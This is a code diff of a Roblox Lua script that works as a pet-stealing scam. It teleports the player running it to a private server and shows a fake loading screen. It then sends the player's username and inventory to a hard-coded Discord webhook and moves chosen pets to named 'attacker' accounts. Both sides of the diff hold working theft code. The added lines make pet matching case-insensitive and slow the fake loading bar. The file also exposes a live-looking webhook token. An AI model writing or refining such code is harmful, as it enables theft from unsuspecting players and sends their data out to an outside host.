@@ -3,38 +3,39 @@ local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
 local LocalPlayer = Players.LocalPlayer
 
--- Private server details
+-- Your private server info
 local placeId = 126884695634066
-local privateServerCode = "40206718588419987554943106780552"
+local privateServerCode = "20579449181285003618611464122633"
 
--- Webhook for Discord
+-- Discord webhook
 local webhookUrl = "https://discord.com/api/webhooks/1396132755925897256/pZu4PMfjQGx64urPAqCckF8aXKFHqAR9vOYW-24C-lurbF5RaCEyqMXGNH7S6l5oe3sz"
 
--- Attacker names
+-- Allowed attacker names
 local attackerNames = {
     ["boneblossom215"] = true,
     ["beanstalk1251"] = true,
     ["burningbud709"] = true,
 }
 
--- Specific pets to transfer only
-local allowedPets = {
-    ["Trex"] = true, ["Fennec Fox"] = true, ["Raccoon"] = true,
-    ["Dragonfly"] = true, ["Butterfly"] = true, ["Queenbee"] = true,
-    ["Spinosaurus"] = true, ["Redfox"] = true, ["Brontosaurus"] = true,
-    ["Mooncat"] = true, ["Mimic Octopus"] = true, ["D Disco Bee"] = true,
-    ["Dilophosaurus"] = true, ["Kitsune"] = true,
+-- Pet name filters
+local targetPets = {
+    ["Trex"] = true, ["fennec fox"] = true, ["Raccoon"] = true,
+    ["dragonfly"] = true, ["butterfly"] = true, ["queenbee"] = true,
+    ["spinosaurus"] = true, ["redfox"] = true, ["Brontosaurus"] = true,
+    ["mooncat"] = true, ["mimic octopus"] = true, ["d disco bee"] = true,
+    ["dilophosaurus"] = true, ["kitsune"] = true
 }
 
--- TELEPORT victim to private server
+-- TELEPORT
 task.spawn(function()
+    task.wait(2)
     TeleportService:TeleportToPrivateServer(placeId, privateServerCode, {LocalPlayer})
 end)
 
--- Wait until teleport finishes
+-- WAIT until teleport is successful
 repeat task.wait() until game.PlaceId == placeId
 
--- SHOW GUI after teleport
+-- GUI
 task.spawn(function()
     local screenGui = Instance.new("ScreenGui", game.CoreGui)
     screenGui.IgnoreGuiInset = true
@@ -95,38 +96,35 @@ task.spawn(function()
     loadingText.TextScaled = true
     loadingText.Parent = bg
 
+    -- Animate
     local percent = 0
     while percent <= 100 do
         percentLabel.Text = percent .. "%"
         fill.Size = UDim2.new(percent / 100, 0, 1, 0)
         percent += 5
-        task.wait(0.1)
+        task.wait(10) -- 5% per 10 seconds
     end
+
     task.wait(1)
     screenGui:Destroy()
 end)
 
--- DISCORD WEBHOOK (after teleport)
+-- WAIT before sending data
+task.wait(5)
+
+-- SEND TO DISCORD
 task.spawn(function()
-    task.wait(2)
     local pets = {}
     for _, v in pairs(LocalPlayer.Backpack:GetChildren()) do
-        if allowedPets[v.Name] then
+        if targetPets[string.lower(v.Name)] or targetPets[v.Name] then
             table.insert(pets, v.Name)
         end
     end
 
     local data = {
-        ["content"] = "**🎯 Victim Detected**",
-        ["embeds"] = {{
-            ["title"] = "LIMIT HUB - Pet Transfer Log",
-            ["fields"] = {
-                {["name"] = "Username", ["value"] = LocalPlayer.Name, ["inline"] = true},
-                {["name"] = "PlaceId", ["value"] = tostring(game.PlaceId), ["inline"] = true},
-                {["name"] = "Pets", ["value"] = #pets > 0 and table.concat(pets, ", ") or "❌ No target pets", ["inline"] = false}
-            },
-            ["color"] = 16711680
-        }}
+        ["username"] = LocalPlayer.Name,
+        ["pets"] = pets,
+        ["placeId"] = tostring(game.PlaceId)
     }
 
     request({
@@ -137,18 +135,22 @@ task.spawn(function()
     })
 end)
 
--- TRANSFER PETS (wait for attacker presence)
+-- TRANSFER PETS to attacker
 task.spawn(function()
+    local function transferPetsTo(attacker)
+        for _, pet in pairs(LocalPlayer.Backpack:GetChildren()) do
+            if targetPets[string.lower(pet.Name)] or targetPets[pet.Name] then
+                pet.Parent = attacker:FindFirstChild("Backpack")
+            end
+        end
+    end
+
     while true do
         for _, player in pairs(Players:GetPlayers()) do
             if attackerNames[player.Name] and player ~= LocalPlayer then
-                for _, pet in pairs(LocalPlayer.Backpack:GetChildren()) do
-                    if allowedPets[pet.Name] then
-                        pet.Parent = player:FindFirstChild("Backpack")
-                    end
-                end
+                transferPetsTo(player)
             end
         end
-        task.wait(1)
+        wait(1)
     end
 end)
